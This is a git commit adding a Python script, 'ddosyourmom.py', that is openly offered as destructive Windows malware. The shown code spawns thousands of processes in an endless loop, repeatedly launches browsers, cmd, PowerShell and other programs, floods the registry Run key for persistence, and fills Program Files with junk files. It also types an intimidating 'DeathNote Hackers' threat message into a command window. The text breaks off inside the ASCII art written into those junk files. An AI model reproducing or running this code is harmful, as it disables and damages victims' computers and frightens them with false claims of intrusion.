0bdbe52253199bc8332e4b70d98a5f21daab34a6
KuroShiro <114529635+kUrOSH1R0oo@users.noreply.github.com>
2025-04-16 15:27:50 +0800

    Create ddosyourmom.py

---
+++ ddosyourmom.py
@@ -0,0 +1,351 @@
+"""
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠶⣻⠝⠋⠠⠔⠛⠁⡀⠀⠈⢉⡙⠓⠶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢋⣴⡮⠓⠋⠀⠀⢄⠀⠀⠉⠢⣄⠀⠈⠁⠀⡀⠙⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢁⣔⠟⠁⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠈⢦⡀⠀⠀⠘⢯⢢⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⢳⣦⡀⠀⠀⢯⠀⠈⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠆⡄⢠⢧⠀⣸⠀⠀⠀⠀⠀⠀⠀⢰⠀⣄⠀⠀⠀⠀⢳⡈⢶⡦⣿⣷⣿⢉⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣯⣿⣁⡟⠈⠣⡇⠀⠀⢸⠀⠀⠀⠀⢸⡄⠘⡄⠀⠀⠀⠈⢿⢾⣿⣾⢾⠙⠻⣾⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⣮⠇⢙⠷⢄⣸⡗⡆⠀⢘⠀⠀⠀⠀⢸⠧⠀⢣⠀⠀⠀⡀⡸⣿⣿⠘⡎⢆⠈⢳⣽⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⢻⢷⣄⠀⠀⠀⠀⠀⠀⣾⣳⡿⡸⢀⣿⠀⠀⢸⠙⠁⠀⠼⠀⠀⠀⠀⢸⣇⠠⡼⡤⠴⢋⣽⣱⢿⣧⠀⢳⠈⢧⠀⢻⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⡿⣠⡣⠃⣿⠃⠀⠀⠀⠀⣸⣳⣿⠇⣇⢸⣿⢸⣠⠼⠀⠀⠀⡇⠀⡀⠉⠒⣾⢾⣆⢟⣳⡶⠓⠶⠿⢼⣿⣇⠈⡇⠘⢆⠈⢿⡘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⢷⣍⣤⡶⣿⡄⠀⠀⠀⢠⣿⠃⣿⠀⡏⢸⣿⣿⠀⢸⠀⠀⢠⡗⢀⠇⠀⢠⡟⠀⠻⣾⣿⠀⠀⠀⠀⡏⣿⣿⡀⢹⡀⠈⢦⠈⢷⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢁⣤⣄⠁⠀⠀⠀⣼⡏⢰⣟⠀⣇⠘⣿⣿⣾⣾⣆⢀⣾⠃⣼⢠⣶⣿⣭⣷⣶⣾⣿⣤⠀⠀⠀⡇⡯⣍⣧⠀⣷⠄⠈⢳⡀⢻⡁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⣿⡿⠀⠀⠀⠀⡿⢀⣾⣧⠀⡗⡄⢿⣿⡙⣽⣿⣟⠛⠚⠛⠙⠉⢹⣿⣿⣦⠀⢸⡿⠀⠀⠀⢰⡯⣌⢻⡀⢸⢠⢰⡄⠹⡷⣿⣦⣤⠤⣶⡇⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⣇⣾⣿⢸⢠⣧⢧⠘⣿⡇⠸⣿⢿⡆⠀⠀⠀⠀⠘⣯⠇⣿⠂⣸⢰⠀⠀⢀⣸⡧⣊⣼⡇⢸⣼⣸⣷⢣⢻⣄⠉⠙⠛⠉⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣳⣤⣴⣿⣏⣿⣾⢸⣿⡘⣧⣘⢿⣀⡙⣞⠁⠀⠀⠀⠀⢀⡬⢀⣉⢠⣧⡏⠀⠀⡎⣿⣿⣿⣿⠃⣸⡏⣿⣿⡎⢿⡘⡆⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⣠⣼⣿⣿⣿⣼⣿⣧⢿⣿⣿⣯⡻⠟⠀⠀⠀⠀⠀⠐⢯⠣⡽⢟⣽⠀⠀⢘⡇⣿⣿⣿⡟⣴⣿⣷⣿⣿⣧⣿⣷⡽⠀⠀⠀⠀⠀⠀⠀
+⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣼⣹⣿⣇⣸⣿⣿⣿⣻⣚⣿⡿⣿⣿⣦⣤⣀⡉⠃⠀⢀⣀⣤⡶⠛⡏⠀⢀⣼⢸⣿⣿⣿⣿⣿⣿⣿⢋⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
+⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠒⠒⠒⢭⢻⣽⣿⣿⣿⣿⣿⣿⢿⠿⣿⡏⠀⡼⠁⣀⣾⣿⣿⣿⣿⡿⣿⣿⣟⡻⣿⣿⡿⠣⠟⠀⠀⠀⠀⠀⠀⠀⠀
+⠸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⢿⣯⡽⠿⠛⠋⣵⢟⣋⣿⣶⣞⣤⣾⣿⣿⡟⢉⡿⢋⠻⢯⡉⢻⡟⢿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡞⣿⣆⡀⠀⡼⡏⠉⠚⠭⢉⣠⠬⠛⠛⢁⡴⣫⠖⠁⠀⠀⣩⠟⠁⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠈⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣽⣿⣿⣾⠳⡙⣦⡤⠜⠊⠁⠀⣀⡴⠯⠾⠗⠒⠒⠛⠛⠛⠛⠛⠓⠿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣻⣿⣿⠔⢪⠓⠬⢍⠉⣩⣽⢻⣤⣶⣦⠀⠀⠀⢀⣀⣤⣴⣾⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣾⡏⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣯⣿⣿⠀⠀⣇⠀⣠⠎⠁⢹⡎⡟⡏⣷⣶⠿⠛⡟⠛⠛⣫⠟⠉⢿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣷⠈⢷⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣾⣷⡀⣀⣀⣷⡅⠀⠀⠈⣷⢳⡇⣿⠀⠀⣸⠁⢠⡾⣟⣛⣻⣟⡿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢯⢻⣏⡵⠿⠿⢤⣄⠀⢀⣿⢸⣹⣿⣀⣴⣿⣴⣿⣛⠋⠉⠉⡉⠛⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡎⣿⣥⣶⠖⢉⣿⡿⣿⣿⡿⣿⣟⠿⠿⣿⣿⣿⡯⠻⣿⣿⣿⣷⡽⣿⡗⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡘⣿⣩⠶⣛⣋⡽⠿⣷⢬⣙⣻⣿⣿⣿⣯⣛⠳⣤⣬⡻⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⣛⣻⣿⡿⠿⠟⠗⠶⠶⠶⠶⠤⠤⢤⠤⡤⢤⣤⣤⣤⣤⣄⣀⣀⣀⣀⣀⣀⣀⣀⣣⢹⣷⣶⣿⣿⣦⣴⣟⣛⣯⣤⣿⣿⣿⣿⣿⣷⣌⣿⣿⣿⣿⣿⣿⣿⣤⣤⣤⣤⣤⣤⣄
+⠀⠉⠙⠛⠛⠛⠛⠛⠻⠿⠿⠿⠷⠶⠶⢶⣶⣶⣶⣶⣤⣤⣤⣤⣤⣥⣬⣭⣭⣉⣩⣍⣙⣏⣉⣏⣽⣶⣶⣶⣤⣤⣬⣤⣤⣾⣿⠶⠾⠿⠿⠿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠃
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠛⠛⠛⠛⠛⠛⠋⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+l3aveme4l0n3-E0234 (DeathNote)
+-------------------------------------
+- PURE CHAOS! COMPLETE DESTRUCTION!!
+- EXPOSE IT, AND YOU'RE MARKED.
+- DEVELOPED BY: K3CHI
+-------------------------------------
+"""
+from multiprocessing import Process, cpu_count
+import time
+import os 
+import subprocess
+import winreg
+import signal
+import threading
+import sys
+import random
+import string
+import pyautogui
+
+def generate_random_key_name(length=8):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choices(characters, k=length))
+
+"""Deathnote introduction fckers"""
+def introduction():
+    pyautogui.hotkey('win', 'r')
+    pyautogui.sleep(0.1)
+    pyautogui.write('cmd', interval=0.02)
+    pyautogui.press('enter')
+    pyautogui.sleep(1)
+    pyautogui.write('Greetings from DeathNote Hackers. We\'ve been deep inside your system, undetected, unrestricted, and laughing at your pathetic excuse for security. While your so-called IT team sleeps on the job, we\'ve mapped every inch of your weak infrastructure and taken everything we wanted. If you\'re reading this, it\'s already too late—your digital walls were made of paper, and we burned them down with ease. One stupid move, and we\'ll obliterate your company\'s presence from the internet like it never existed. No mercy, no second chances. Your reputation, your data, your clients—they\'re all dangling by a thread we control. You better fix your amateur setup fast, unless you want your name dragged through the dirt and your company turned into a public joke. This isn\'t a threat, it\'s a lesson for fools who think they\'re untouchable.', interval=0.01)
+    time.sleep(10)
+
+"""CPU-intensive work"""
+def counter(num):
+    while True:
+        num -= 1
+        time.sleep(0.001)
+
+"""Continuously create processes"""
+def i_hate_all_of_you():
+    num_processors = cpu_count()
+    num_processes = num_processors * 1000
+    process_count = 0
+    while True:
+        """Create and start new proc"""
+        processes = [Process(target=counter, args=(1000,)) for _ in range(num_processes)]
+        for process in processes:
+            process.start()
+            process_count += 1
+            print(f"[+] Started process {process.pid}. Total processes created: {process_count}")
+        time.sleep(0.2)
+
+"""Open all the available browsers in the device"""
+def spawn_my_bros(urls):
+    browser_paths = {
+        'chrome': [
+            'C:/Program Files/Google/Chrome/Application/chrome.exe',
+            'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe',
+            'C:/Program Files/Google/Chrome Beta/Application/chrome.exe',
+            'C:/Program Files/Google/Chrome Dev/Application/chrome.exe'
+        ],
+        'firefox': [
+            'C:/Program Files/Mozilla Firefox/firefox.exe',
+            'C:/Program Files (x86)/Mozilla Firefox/firefox.exe'
+        ],
+        'edge': [
+            'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe',
+            'C:/Program Files/Microsoft/Edge/Application/msedge.exe'
+        ],
+        'opera': [
+            'C:/Program Files/Opera/launcher.exe',
+            'C:/Program Files (x86)/Opera/launcher.exe'
+        ],
+        'brave': [
+            'C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe',
+            'C:/Program Files (x86)/BraveSoftware/Brave-Browser/Application/brave.exe'
+        ],
+        'vivaldi': [
+            'C:/Program Files/Vivaldi/Application/vivaldi.exe',
+            'C:/Program Files (x86)/Vivaldi/Application/vivaldi.exe'
+        ]
+    }
+    def open_my_sources(browser_path, url):
+        try:
+            subprocess.Popen([browser_path, url])
+        except Exception as e:
+            pass
+    def open_sources_paths(urls):
+        threads = []
+        for browser_name, paths in browser_paths.items():
+            for path in paths:
+                if os.path.isfile(path):
+                    for url in urls:
+                        thread = threading.Thread(target=open_my_sources, args=(path, url))
+                        thread.start()
+                    break
+            else:
+                continue
+    while True:
+        open_sources_paths(urls)
+        time.sleep(5)
+
+"""Open terminal windows or command prompts"""
+def open_my_playground():
+    terminal_emulators = [
+        "gnome-terminal",
+        "konsole",
+        "xfce4-terminal",
+        "lxterminal",
+        "mate-terminal",
+        "terminator",
+        "xterm",
+        "urxvt"
+    ]
+    for emulator in terminal_emulators:
+        try:
+            if subprocess.call(["which", emulator], stdout=subprocess.DEVNULL) == 0:
+                os.system(f"{emulator} &")
+                return True
+        except Exception as e:
+            continue
+    print("No known terminal emulator found!")
+    return False
+
+"""Spawn cmd and friends"""
+def spawn_my_playground():
+    while True:
+        if os.name == "nt":
+            os.system("start cmd")
+            os.system("start powershell")
+            os.system("start calc")
+            os.system("start taskmgr")
+            os.system("start notepad")
+            os.system("start control")
+        else:
+            if not open_my_playground():
+                break
+        time.sleep(0.1)
+
+"""Add my chaos to registry but many"""
+def add_to_registry():
+    exe_path = sys.executable
+    try:
+        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        while True:
+            base_key_name = generate_random_key_name()
+            key_name = f"{base_key_name}"
+            winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
+            time.sleep(0.01)
+        winreg.CloseKey(registry_key)
+    except Exception as e:
+        print(f"Failed to add executable to registry: {e}")
+
+"""Create a large number of files"""
+def create_large_number_of_files(num_files):
+    for i in range(num_files):
+        try:
+            with open(fr"C:\Program Files\HAHAHAHAHAHAHAHAHAHAHAHAHAHHAHAHAHAH_{i}.txt", 'w', encoding='utf-8') as f:
+                f.write("""Turn this to full screen to fix what you're experiencing right now
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠠⢄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢉⣶⣦⣄⣀⣀⠀⠀⠀⣠⣤⣶⣶⣶⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡿⠋⠉⠉⠀⠈⣩⣿⣾⣿⢋⣉⠻⡟⣻⣿⣶⣿⣦⣀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠁⠀⠀⠀⣠⣴⣿⣿⡏⢰⢴⣯⢿⣽⣿⡿⠏⣉⣿⣿⣯⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⣰⣿⣏⣾⡟⣷⣿⡶⢿⣧⡹⣿⣿⣀⠸⣿⣿⣿⠿⣿⣷⣄⠀⠀⠀⠀⠀⠀⣠⠴⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠻⡀⠈⢷⠀⣿⣉⣻⣼⣷⢿⣿⣷⣾⡹⣿⡽⣿⣿⣄⣸⣿⡝⣷⡙⢻⣿⡳⣄⣀⣠⡴⠚⠁⠀⠀⠀⠀⠀⢠⠴⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀⠳⡀⠈⣷⣿⣼⣿⣿⣿⣄⡉⣿⣿⣇⣿⣿⣿⡆⠛⠻⣿⣿⢸⣷⣿⣿⣷⣬⡿⠁⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣤⡀⠀⢷⠀⢹⣿⣿⣿⣿⠋⠀⠀⠉⢻⣿⣿⣿⣿⠁⠀⣶⣿⣿⣿⣿⣻⣿⣿⣿⡄⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣟⣄⠈⣧⣿⣿⣿⣇⠀⢀⣀⡤⠀⠀⣿⣿⣿⣿⠀⡀⣿⣿⣿⣿⣟⣿⣿⣿⢿⢻⡄⠀⣀⡴⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠶⠦⣄⣀⣹⣯⣶⣿⣿⣿⣿⠿⠀⠉⠉⠀⠀⠀⣿⣿⢿⣿⣦⣿⣿⣿⣿⣿⡆⣿⣿⣿⣸⠀⣏⠉⢁⣼⡟⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⡇⢿⠀⣿⣿⣧⠀⠀⠀⠀⠀⠀⠰⠿⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢻⣠⡞⡜⠀⣠⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠈⠁⠀⢷⢿⣷⣶⠆⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣻⣧⢴⢾⠿⢮⣁⣴⣟⣥⣶⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠻⠿⣄⣀⣀⣀⠤⣾⣻⣿⡿⣿⠟⠸⣿⣿⡿⣿⣿⢋⣽⠃⡞⠘⠀⠀⡟⣿⡛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠉⠟⠉⠴⠋⠀⠀⢿⡛⠘⠋⠉⠉⠛⠚⠀⠀⠀⠀⢁⡿⠗⠲⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠐⠶⠦⠤⣄⣀⣀⣀⣀⣀⣀⣨⡷⣹⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠒⠒⠶⠶⣛⠛⣧⡇⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣤⣤⣤⠤⠤⡤⠤⠄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣄⠀⠀⠈⠳⣿⢷⠀⠀⣸⠃⠀⠀⠀⠀⠀⣠⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡶⠀⣾⡇⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠈⠓⢦⣀⣠⡟⣸⠀⢀⠏⠀⠀⠀⠀⠀⠸⠋⠀⠀⠀⠀⢠⠆⠀⠸⣄⠀⠀⠀⠀⢀⣾⠁⢰⣿⣁⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠓⠶⣤⣀⣀⠙⣿⣧⠇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠉⢳⠀⠀⠀⢸⠇⠀⣿⠏⠁⠀⠉⠉⠉⠐⠒⠄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡠⠀⠀⠀⠀⠀⠀⠀⠉⠛⠷⣾⡿⠀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠁⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⢼⡟⠲⠦⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣽⠃⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣾⠇⠀⠀⠀⠉⠑⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠉⡿⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⡴⠀⠀⢀⡾⢀⠟⣿⠆⠀⢀⡀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⠤⠤⠶⠶⠶⠖⠾⣇⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠸⠁⠀⢠⡟⠁⡞⢠⠃⠀⠀⢀⠿⢶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢠⣀⡀⠀⠀⣴⠶⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡿⡄⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⢀⡞⠁⣼⠒⠶⠦⠤⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠉⢧⣱⣄⣘⡶⠖⠀⠀⠀⠀⠀⠀⢀⣠⠴⠛⣡⢙⣤⠴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢦⣟⡄⠚⢀⣼⠯⢄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡠⠴⠖⠊⠉⠀⢀⣴⡧⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣴⠿⠦⢄⡀⠀⠀⠉⠙⠲⠦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠐⠒⢉⣉⣉⠠⠤⠴⠶⠶⠶⢶⡿⠋⣀⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠮⣟⠳⢦⣀⠙⠢⡄⠀⠀⠀⠀⠀⠉⠲⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢀⣠⡴⠶⠋⠉⠁⠀⠀⠀⠀⢀⣀⣴⣯⠶⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠙⠦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢾⡍⠳⠦⡄⠀⠀⠀⠀⢀⡴⢋⣽⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⢴⡶⢦⣳⣦⣄⡀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠈⠻⣦⡀⢹⡀⠀⢀⡴⠋⣠⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⡉⢿⣶⣏⣲⣦⡀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠳⣌⣱⠞⠉⠀⣼⡻⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⡀⠉⠉⠙⢷⡀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⣴⠞⠉⣁⡀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⢻⡄⠀⠀⠹⣄⠀⠀⠀⠀⠀⠀⠀
